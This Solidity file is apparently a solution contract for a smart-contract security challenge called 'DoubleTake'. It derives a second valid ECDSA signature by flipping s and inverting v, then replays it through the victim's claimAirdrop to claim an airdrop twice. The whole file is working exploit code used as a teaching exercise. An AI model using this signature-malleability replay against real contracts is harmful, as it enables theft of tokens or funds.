// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../DoubleTake.sol";

import "hardhat/console.sol";

//Signature malleability
//Given a valid signature, an attacker can do some quick arithmetic to derive a different one.
//The attacker can then “replay” this modified signature.

contract DoubleTakeHack {
    DoubleTake victim;

    constructor(DoubleTake victim_)  {
        victim = victim_;
    }

    function attack() external {
        address user = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;
        uint8 v = 28;
        bytes32 r = 0xf202ed96ca1d80f41e7c9bbe7324f8d52b03a2c86d9b731a1d99aa018e9d77e7;
        bytes32 s = 0x7477cb98813d501157156e965b7ea359f5e6c108789e70d7d6873e3354b95f69;
        bytes32 hash = keccak256(abi.encode(user, 1 ether));

        // The following is math magic to invert the
        // signature and create a valid one
        // flip s
        bytes32 s2 = bytes32(uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141) - uint256(s));

        // invert v
        uint8 v2;
        require(v == 27 || v == 28, "invalid v");
        v2 = v == 27 ? 28 : 27;


        address signer1 = ecrecover(hash, v, r, s);
        address signer2 = ecrecover(hash, v2, r, s2);

        // different signatures on one message, same signer!
        console.log(signer1);
        console.log(signer2);
        assert(signer1 == signer2);

        victim.claimAirdrop(user, 1 ether, v2, r, s2);
    }
}
